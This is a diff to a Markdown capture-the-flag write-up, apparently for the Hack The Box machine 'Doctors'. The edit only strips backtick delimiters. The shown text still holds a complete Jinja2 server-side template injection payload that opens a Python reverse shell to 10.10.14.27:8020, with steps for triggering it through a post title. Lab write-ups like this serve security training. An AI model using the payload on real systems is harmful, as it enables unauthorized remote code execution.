@@ -144,9 +144,8 @@ Apparently our SSTI did work for payloads `{{4*4}}` and `{{7*'7'}}` which confir
 
 Now that we are certain of SSTI we can grab the [**remote code execution payload**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset) from PayloadsAllTheThings and modify it with our IP/Port and changing the subprocess call to `/bin/bash -i` to drop us a reverse shell:
 
-`
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.27\",8020));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
-`
+
 
 Inputting the above payload inside title and once posted, refreshing the `http://doctors.htb/archive` page drops us a reverse shell:
 
